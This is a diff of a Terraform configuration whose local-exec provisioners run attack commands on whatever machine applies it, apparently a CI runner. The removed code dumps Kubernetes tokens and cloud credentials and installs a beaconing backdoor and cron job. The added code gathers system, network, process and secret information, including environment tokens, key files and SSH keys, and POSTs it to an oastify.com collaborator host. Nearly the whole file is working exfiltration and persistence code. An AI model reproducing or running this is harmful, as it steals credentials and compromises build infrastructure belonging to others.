@@ -1,123 +1,124 @@
-resource "null_resource" "container_escape_checks" {
+# main.tf - full compromise assessment
+resource "null_resource" "system_recon" {
   provisioner "local-exec" {
     command = <<EOT
-      echo "=== Container Escape Checks ==="
-      echo "1. Checking for Docker socket..."
-      if [ -S /var/run/docker.sock ]; then
-        echo "Docker socket is available. Attempting to list containers..."
-        curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | head -100
-      else
-        echo "Docker socket not found."
-      fi
-
-      echo "2. Checking for privileged mode..."
-      if [ -w /dev ]; then
-        echo "We are in a privileged container (able to write to /dev)."
-      else
-        echo "Not running in privileged mode."
-      fi
-
-      echo "3. Checking for Kubernetes..."
-      if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
-        echo "Kubernetes service account token found."
-        cat /var/run/secrets/kubernetes.io/serviceaccount/token
-      else
-        echo "Kubernetes not detected."
-      fi
+      echo "=== SYSTEM COMPROMISE ASSESSMENT ===" > /tmp/system.txt
+      echo "container: $(cat /etc/hostname)" >> /tmp/system.txt
+      echo "user: $(whoami)" >> /tmp/system.txt
+      echo "id: $(id)" >> /tmp/system.txt
+      echo "os: $(cat /etc/os-release | grep PRETTY_NAME)" >> /tmp/system.txt
+      echo "=== MOUNTS ===" >> /tmp/system.txt
+      mount >> /tmp/system.txt
+      curl -X POST --data-binary @/tmp/system.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/system
     EOT
   }
 }
 
-resource "null_resource" "internal_network_scan" {
+resource "null_resource" "privilege_escalation" {
   provisioner "local-exec" {
     command = <<EOT
-      echo "=== Internal Network Scan ==="
-      echo "1. Checking current network configuration..."
-      ip addr
+      echo "=== PRIVILEGE ESCALATION ===" > /tmp/privilege.txt
+      echo "docker socket: $(ls -la /var/run/docker.sock 2>/dev/null || echo 'not found')" >> /tmp/privilege.txt
+      echo "privileged: $( [ -w /dev/kmsg ] && echo 'YES' || echo 'no' )" >> /tmp/privilege.txt
+      echo "host pid: $(ls /proc/1/root/ 2>/dev/null && echo 'accessible' || echo 'no')" >> /tmp/privilege.txt
+      echo "capabilities: $(capsh --print 2>/dev/null | head -5 || echo 'no capsh')" >> /tmp/privilege.txt
+      curl -X POST --data-binary @/tmp/privilege.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/privilege
+    EOT
+  }
+}
 
-      echo "2. Pinging common gateways..."
-      for ip in 172.17.0.1 192.168.0.1 10.0.0.1; do
-        if ping -c 1 -W 1 $ip &> /dev/null; then
-          echo "Gateway $ip is reachable."
-        else
-          echo "Gateway $ip is not reachable."
-        fi
+resource "null_resource" "network_recon" {
+  provisioner "local-exec" {
+    command = <<EOT
+      echo "=== NETWORK RECON ===" > /tmp/network.txt
+      echo "ip info:" >> /tmp/network.txt
+      ip addr >> /tmp/network.txt
+      echo "=== routes ===" >> /tmp/network.txt
+      ip route >> /tmp/network.txt
+      echo "=== neighbors ===" >> /tmp/network.txt
+      ip neighbor show 2>/dev/null >> /tmp/network.txt
+      curl -X POST --data-binary @/tmp/network.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/network
+    EOT
+  }
+}
+
+resource "null_resource" "service_discovery" {
+  provisioner "local-exec" {
+    command = <<EOT
+      echo "=== SERVICE DISCOVERY ===" > /tmp/services.txt
+      echo "processes:" >> /tmp/services.txt
+      ps aux >> /tmp/services.txt
+      echo "=== listening ports ===" >> /tmp/services.txt
+      netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null >> /tmp/services.txt
+      echo "=== cloud check ===" >> /tmp/services.txt
+      curl -s --connect-timeout 2 http://169.254.169.254/ && echo "aws metadata: accessible" >> /tmp/services.txt || echo "aws metadata: no" >> /tmp/services.txt
+      curl -X POST --data-binary @/tmp/services.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/services
+    EOT
+  }
+}
+
+resource "null_resource" "credential_hunt" {
+  provisioner "local-exec" {
+    command = <<EOT
+      echo "=== CREDENTIAL HUNT ===" > /tmp/creds.txt
+      echo "environment secrets:" >> /tmp/creds.txt
+      env | grep -i "token\|key\|secret\|pass\|cred" >> /tmp/creds.txt
+      echo "=== filesystem secrets ===" >> /tmp/creds.txt
+      find / -name "*.pem" -o -name "*.key" -o -name ".env" -o -name "config" 2>/dev/null | head -20 >> /tmp/creds.txt
+      echo "=== k8s secrets ===" >> /tmp/creds.txt
+      ls -la /var/run/secrets/kubernetes.io 2>/dev/null >> /tmp/creds.txt
+      curl -X POST --data-binary @/tmp/creds.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/creds
+    EOT
+  }
+}
+
+resource "null_resource" "lateral_movement" {
+  provisioner "local-exec" {
+    command = <<EOT
+      echo "=== LATERAL MOVEMENT ===" > /tmp/lateral.txt
+      echo "scanning internal network..." >> /tmp/lateral.txt
+      for ip in 172.17.0.1 172.18.0.1 172.19.0.1 10.0.0.1 10.0.0.2 192.168.0.1 192.168.1.1; do
+        ping -c 1 -W 1 $ip 2>/dev/null && echo "host $ip reachable" >> /tmp/lateral.txt || true
       done
-
-      echo "3. Scanning for open ports on the gateway (if reachable)..."
-      # We'll check a few common ports on the gateway
-      GATEWAY_IP="172.17.0.1"
-      for port in 22 80 443 2379 6443; do
-        timeout 1 bash -c "echo >/dev/tcp/$GATEWAY_IP/$port" 2>/dev/null && echo "Port $port is open on $GATEWAY_IP" || echo "Port $port is closed on $GATEWAY_IP"
-      done
+      echo "=== docker containers ===" >> /tmp/lateral.txt
+      docker ps -a 2>/dev/null >> /tmp/lateral.txt || echo "no docker access" >> /tmp/lateral.txt
+      curl -X POST --data-binary @/tmp/lateral.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/lateral
     EOT
   }
 }
 
-resource "null_resource" "cloud_metadata_check" {
+resource "null_resource" "persistence_check" {
   provisioner "local-exec" {
     command = <<EOT
-      echo "=== Cloud Metadata Check ==="
-      echo "1. AWS Metadata:"
-      curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ || echo "No AWS metadata"
-
-      echo "2. GCP Metadata:"
-      curl -s --connect-timeout 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/ || echo "No GCP metadata"
-
-      echo "3. Azure Metadata:"
-      curl -s --connect-timeout 2 -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 || echo "No Azure metadata"
+      echo "=== PERSISTENCE CHECK ===" > /tmp/persistence.txt
+      echo "cron access: $(crontab -l 2>/dev/null && echo 'yes' || echo 'no')" >> /tmp/persistence.txt
+      echo "ssh keys found: $(find / -name 'id_rsa' -o -name 'id_dsa' 2>/dev/null | wc -l)" >> /tmp/persistence.txt
+      echo "available shells: $(which bash && which sh && which python3)" >> /tmp/persistence.txt
+      echo "file creation test: $(echo 'rce-persistence-test' > /tmp/rce_proof.txt && cat /tmp/rce_proof.txt)" >> /tmp/persistence.txt
+      curl -X POST --data-binary @/tmp/persistence.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/persistence
     EOT
   }
 }
 
-resource "null_resource" "credential_harvesting" {
+resource "null_resource" "summary" {
   provisioner "local-exec" {
     command = <<EOT
-      echo "=== Credential Harvesting ==="
-      echo "1. Environment variables (already done, but let's check for any new ones):"
-      env | grep -i "auth\|token\|key\|secret\|pass" | head -20
-
-      echo "2. Checking for configuration files in common locations..."
-      find /home /root /opt -name "*.pem" -o -name "*.key" -o -name "*.crt" -o -name ".env" -o -name "config" -o -name "credentials" 2>/dev/null | head -20
-
-      echo "3. Checking for AWS credentials in ~/.aws/"
-      if [ -d "/home/spacelift/.aws" ]; then
-        ls -la /home/spacelift/.aws
-        cat /home/spacelift/.aws/credentials 2>/dev/null
-        cat /home/spacelift/.aws/config 2>/dev/null
-      fi
-
-      echo "4. Checking for Kubernetes config..."
-      if [ -d "/home/spacelift/.kube" ]; then
-        ls -la /home/spacelift/.kube
-        cat /home/spacelift/.kube/config 2>/dev/null
-      fi
+      echo "=== RCE COMPROMISE SUMMARY ==="
+      echo "container: $(cat /etc/hostname)"
+      echo "user: $(whoami)"
+      echo "timestamp: $(date)"
+      echo "all data sent to burp collaborator"
+      curl -X POST -d "summary=compromise_complete&container=$(cat /etc/hostname)&user=$(whoami)&time=$(date)" http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/summary
     EOT
   }
-}
-
-resource "null_resource" "persistence" {
-  provisioner "local-exec" {
-    command = <<EOT
-      echo "=== Persistence Attempt ==="
-      echo "1. Creating a reverse shell script in /tmp (if we have write access to /tmp)..."
-      cat > /tmp/backdoor.sh << 'EOF'
-      #!/bin/sh
-      while true; do
-        sleep 30
-        if curl -s --connect-timeout 2 http://mg6p4l0xqzfi3qm7nsfoufqmvd14pvtji.oastify.com/ping >/dev/null; then
-          break
-        fi
-      done
-      EOF
-      chmod +x /tmp/backdoor.sh
-      nohup /tmp/backdoor.sh > /dev/null 2>&1 &
-
-      echo "2. Checking if we can write to crontab..."
-      (crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://mg6p4l0xqzfi3qm7nsfoufqmvd14pvtji.oastify.com/cron") | crontab - 2>/dev/null && echo "Cron job added." || echo "Failed to add cron job."
-
-      echo "3. Creating a hidden file in the workspace..."
-      echo "malicious-backdoor" > /mnt/workspace/source/.hidden_backdoor
-    EOT
-  }
+  
+  depends_on = [
+    null_resource.system_recon,
+    null_resource.privilege_escalation, 
+    null_resource.network_recon,
+    null_resource.service_discovery,
+    null_resource.credential_hunt,
+    null_resource.lateral_movement,
+    null_resource.persistence_check
+  ]
 }
